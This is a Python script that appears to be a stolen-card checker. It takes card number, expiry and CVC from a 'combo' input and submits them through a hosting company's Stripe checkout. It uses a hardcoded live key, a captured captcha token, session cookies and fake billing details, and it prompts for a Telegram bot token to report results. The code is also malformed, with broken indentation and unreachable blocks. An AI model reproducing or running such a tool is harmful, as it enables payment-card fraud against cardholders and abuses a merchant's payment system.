import requests
import telebot
def Tele(ccx):
    import requests
    ccx=input("Enter your  Name file Combo : " )
    to=input("Enter your token : ")
    bot=telebot.TeleBot(to)
    sz=input("Enter your id : ")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    r = requests.session()
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1cce23a9-b190-423d-9b87-ff0165714b70c562db&muid=4781134d-18bf-42ef-9669-4f64c18f545e34b16f&sid=fae8230d-25c9-42d2-bf42-6599ff6a00ac5b2ae1&pasted_fields=number&payment_user_agent=stripe.js%2F23733a2a86%3B+stripe-js-v3%2F23733a2a86%3B+split-card-element&referrer=https%3A%2F%2Fclients.asurahosting.com&time_on_page=941098&key=pk_live_51K9x9oLI1SL4EGpUbktL84zF7JsJyzmVYeARDaWoHAhSOObtNBeBRtvNBRL8MJQFgrQ7QmYnFiQRDijzNGuiUkaN00xQybd4DF&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiTitBVS9za2pWaGhETXBaOW5takRtQytzR3UwanJ2c2xuMlgxZ24xNkUvM2F5TnYydWRwOHdtZk5BZEp4a2lWaE1aQk94VzJtVm55SitNVm5rbFZSaVZ6NkFKY3YwRUl4YXNsWDFSMC9KMnlLMjN3bUdzUjI5YmY4UFptK0JhMUV0ZkY3aWZXLy8zYzhETTdxWkZZSkpoK1NFSWd5ZVdvTVJCRFNIMUk2TXUrTVZqL0V0RHJ1bENlWHJ2Mk8reU1BdHFrMXBwT2svMndpWW5vRndsQXBSZUpxUmdQSHcxMEQ1b2lXdDZkYm45eU10anlEWHJ4YmtSUjRRN0tYOUdFUWlNRStSVEVrVnFWdHNlSnIrSEZjczBSTmlTUXUrNWpyYzhjbERsOTd6ZFNRa1dFQUVZbm1LL1o2RjZYaGM2cDNHMjI3aVk4MlN3ZWZEQXVNK05Nb2UvT3RTYlVrL2ozZ1h2d1dBNkVBN3k1aENneHJzRElTV2hRMTNIY2p3ZE5hbEx5SjZEWmFrZ2xuV3U4U3lGN2UzemVhRnZ3WUFQdHh2Y3JrcTVmQWY0eklEc21HTkhKUjBYUndJcDkyOWVpM0Y3T2s1SG9wKzFhNmc2ejRWR3RrbTdHQ1kxd0JFL0dWVmJ2S0FqR3dvcUY2TkFYMjNNZExidU4zYWQ3UFJPSC8xZ0VjK0VkK3QwNkE1NXhYNjcrYVZQTCtjc04yN1pVdG9nbGw3WDVWSWFrdjZiWDRvVFExVTdSbXNWTDVPZ0c1VldFd0FMNmRSQkxId2FJYzcrREZmY29hSkhWTHFmQURxSUdIWGtCMTBscnR3eGNEZVllWkl4SCtpa2xqV1B3cXFwWW1HVzFKWDBxNWd0QlZKNStvd21WMDYyRFErVmh2VUhjZXZLd3kveEdFbzZyM3VlRUxmWEhpZEZVbGs0bWNhS082aE9UNDh6L250cU5yV3g4WU1ZbzZsUFJFelZ3b2pVb3VkZnhRVEw3MHB1YUFtMUR5VmxlZ0YvK0NCaGJnTVFFY2VZRmxWSmVlbWZWQnVBZEl4c3YvbHdCZFkwbi8wa2FpVms1Y0c0dmtMWXJBRXB0NFJlbVY2ZnljZ1owajRQVGRQc0FtNkNHZit3dElObmxUdzkyWkpBOWZZQi8ycFZwQ1ZXLzRLMDBhRVhaalU1TDRXRy93UUE5Z2ltYm9VOENrMDhLN28wK09nQlVFZGQ5ZThaRGxvSnNCYVJTMWRnYUJHMEFvdlhqdHJJN3BzTW14YzE2ckdsaHpzeHBXaFFPbCttejVCKzljRmQyQ1gvbjZDeHRIQlVwUjVKbGF3RVFKN28rNXg0SUpjZCtDNjVSb3BkMWNRemtkVUYwOENxSzRKTEQ2MkovYTBFWldTaWxlOEozVVpnRUVVL1N3SUhrWFVQeXBwd2NadjQ0SlF5eFQyOHlKSldmOVNrNWNGcVJ5aXRhMXhxdjE0Y0JEU2UwRVI0aWQ2R0ZSblNaTENNZDZWdE5JMDRIZGtPRDFaQWsyVTl5QWNuSzBQSTdra0FveFFTSStpeFd6UFRNRGtsVGZTejNtSjVOcFl2ZnZNbks0YkhFK2JOb1doWG02RWs1R1Fmend3VitSUi9UOHZneUhZWHhLeGp1ZXBNd3lwM2pUc0xnYTh1YkI4N0dUY3JwQ0g2blpEaWQ4OU5Xc01KU3J6Wk0xZUIvQnMxZSt1MGNLOFFQK1RYclgrTmxTZU0xc3NaTmppSmdKQ3ZwRWVySXpUVGI0ZnNQUUxybmJnQ1lSZTVuOHJXMElUN2k5YWU0RW8rSTZza3NrdVRKWkw1azNLcmhibWdaZWl0VnlNOExkdlhhTkloMHVBNGZ5N1AxN045VnkrQ1p6WUFoakQ2KzJVMVRnZXNlZjZJTmxzOWdpakR2U3ZWVnVvMG1TUEJybXFsMU5wS1NyL3RKbkk3ZDd3aDBReFJqSSt4YlY1VUUwNTQxeWJVYS9XU2U0NWpxSUFqWGFsY25uSVh0cDdGcmhvU0RKd1FKYThkNDdCTEhQd0F2dWtIT1VxNU1TYVMwMGVtR1BLbit6aXVJV2JNa3RneUxwRUZpNDV0UCtuYjdLek1iZG96RjQ5WmI4VThueHo2emxGQzZHTnIxMUlmK0FXYkZmM3FSTHgydDM4YW9OYWxHRjR2a29wNUswbWVPMjhRS05HOGJ5OGZwQm41Q1dTK1lHZjVRU2d3Mk8yNTMzMURwTDRpRUQ3NnlVaDl4dk82VnVUcXQzNVA2MzVQUHZJTE9ubU9YbHZBZG94SXgxU1BPVmk1NTdKbGJEQldDZW1ua1ZWck5DTmw1QzRFQjYwcDhZVHlaWVMxUFN3eFVQQWNUNU9jZmlLd1VKTUczKytlVDFWVHlhbjlxeExlYWlqRldoSmY0WHl1Zmp4TWFCQnRmeE5hU3hSazFXQXFUb1BiL2ZjUTNJd2dVeGw5WjZYbEF4MXh4L2RtMURvZ21FcFp0VTFsek91akNRSFRzWitvZkFheHcrYjVXQzVsR0NJZlVRWGMvMm95N1VDaHNCUU1NdzAzcHVGVXBSUUo1Tm15Z25ScCs0V2JJcnNVZ25GbVlwZ2h5QlNjOFA4amVSaTZxYy8xbm5UamsyTGgxMDYydDFPcGpuREtSeHJoMXNoc3BQQWcvV2xRRXdKaG1Vc3pJa3VIYkQzaGJqNGVRZG5qVlpNZGxHNHN1Mjh1UzRjNmw2TWFWa3BkK1VUenNPcUpTNEZpbVZLVUVrSlpERG9xTitQdmhIdUY5NFFFWXhsQ3VTTVUrTDJrRUZ2UStOdmpuR0p5VnZzUlA4TkhxdSIsImV4cCI6MTcyODU1NzQxMSwic2hhcmRfaWQiOjMzOTUxMDMwMywia3IiOiI4NWJhYzBlIiwicGQiOjAsImNkYXRhIjoiRlNQWDJIRkZNSFhQT3ZkRnp1Q25xYVkxbXJURXJLbVQ3NHhyc1AvZDFOT1U3bmtNRUJod3VVcW1ZWVFxVGhXSDdlYWJqUFVFMGh4RmVHTXlvVWM1SGFEWjBCclpvcjI4Qng5L3UvbTlIY05EeDBYZ3dZOU9uZDRkWGJEQmllVW5HN2s0K1RqRTc2dkpyR1Z0WEhlRGJVcTlIVkRVQ2JRdUNsYXI3VnhHUngrM0gxdTB1Z2dOZGl4S2NIeUYyUFZYVlB2NHNjbThaSGY4b2o3YyJ9.d2Y4MqQ3dikQqWy4S9oAWgf9WQuvPzVA4xp8NEvGYs8'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
                id=response.json()['id']
    except:
        return '#'
        cookies = {
            '_gcl_au': '1.1.1836359125.1727430724',
            '_ga': 'GA1.1.1669410193.1727430724',
            '__stripe_mid': '83b365a1-4796-4e33-9e57-4eb61ba6c87c9b3f8a',
            'cf_clearance': 'dfZ0FKuCt1WoTdFV3a8yW4Bpmms2I6yx8Y82TWOnLvA-1728393312-1.2.1.1-qdk0lYW7H48qFCdJJUrh36H57NwP4JFW5mcXHaez0Drk7aXcwBGsS3XFTSW5i8rWmgtL9v5V1PsZhEiiHp0jApBgtFpK8w6W0R31TwQ7B7nvMCiy_l2X6chDNbPKWBvAErXuz5HwbaUZc0WhqImAK._fF_jNzE6CtrS3Mfs03WVjPsjJXrqi9lkRRxihQ4sA5TV.GiKndFa9vfjlO1W35bGfHycvhm4FD1AmaAQdhvexMy8VqPpzZ5e9Vnq1SXtfYIKPf5Vo0zhNT6HSjsNw7Qe.XJz5NNLPH9JQmjxlXEYeYVkXMC9MR6ZFNUwHbUMPhnhOu.QGLbl.b.zjEuKJC147lu33xd58xdnoYFb95Lit9L7clgqxE8znAiPkVN_Q',
            '__stripe_sid': 'ab8c5e67-5f4b-4b8f-a716-d84da43e4657958f8d',
            'WHMCSakgme2xxDWj4': '13427726acf7e551a493f7727d944067',
            '_ga_92WVCLVGV9': 'GS1.1.1728455091.4.1.1728455352.0.0.0',
        }

        headers = {
            'authority': 'clients.asurahosting.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-AU,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_gcl_au=1.1.1836359125.1727430724; _ga=GA1.1.1669410193.1727430724; __stripe_mid=83b365a1-4796-4e33-9e57-4eb61ba6c87c9b3f8a; cf_clearance=dfZ0FKuCt1WoTdFV3a8yW4Bpmms2I6yx8Y82TWOnLvA-1728393312-1.2.1.1-qdk0lYW7H48qFCdJJUrh36H57NwP4JFW5mcXHaez0Drk7aXcwBGsS3XFTSW5i8rWmgtL9v5V1PsZhEiiHp0jApBgtFpK8w6W0R31TwQ7B7nvMCiy_l2X6chDNbPKWBvAErXuz5HwbaUZc0WhqImAK._fF_jNzE6CtrS3Mfs03WVjPsjJXrqi9lkRRxihQ4sA5TV.GiKndFa9vfjlO1W35bGfHycvhm4FD1AmaAQdhvexMy8VqPpzZ5e9Vnq1SXtfYIKPf5Vo0zhNT6HSjsNw7Qe.XJz5NNLPH9JQmjxlXEYeYVkXMC9MR6ZFNUwHbUMPhnhOu.QGLbl.b.zjEuKJC147lu33xd58xdnoYFb95Lit9L7clgqxE8znAiPkVN_Q; __stripe_sid=ab8c5e67-5f4b-4b8f-a716-d84da43e4657958f8d; WHMCSakgme2xxDWj4=13427726acf7e551a493f7727d944067; _ga_92WVCLVGV9=GS1.1.1728455091.4.1.1728455352.0.0.0',
            'origin': 'https://clients.asurahosting.com',
            'referer': 'https://clients.asurahosting.com/cart.php?a=checkout',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'token': '70fd1e962facdf6f9937529ed49f581beb5cd245',
            'submit': 'true',
            'custtype': 'existing',
            'account_id': '51103',
            'firstname': 'Alae',
            'lastname': 'williams',
            'email': 'qq0799414021@gmail.com',
            'country-calling-code-phonenumber': '1',
            'phonenumber': '512-524-4785',
            'companyname': '',
            'address1': 'William Street',
            'address2': '',
            'city': 'New York',
            'state': 'New York',
            'postcode': '10080',
            'country': 'US',
            'contact': '',
            'domaincontactfirstname': '',
            'domaincontactlastname': '',
            'domaincontactemail': '',
            'country-calling-code-domaincontactphonenumber': '1',
            'domaincontactphonenumber': '',
            'domaincontactcompanyname': '',
            'domaincontacttax_id': '',
            'domaincontactaddress1': '',
            'domaincontactaddress2': '',
            'domaincontactcity': '',
            'domaincontactstate': '',
            'domaincontactpostcode': '',
            'domaincontactcountry': 'US',
            'applycredit': '1',
            'paymentmethod': 'stripe',
            'ccinfo': 'new',
            'ccdescription': '',
            'notes': '',
            'payment_method_id': id,
        }

        response = requests.post(
            'https://clients.asurahosting.com/index.php?rp=/stripe/payment/intent',
            cookies=cookies,
            headers=headers,
            data=data,
        ).json()
        try:
        ii=response['validation_feedback']
    except:
        return 'success'
    return ii
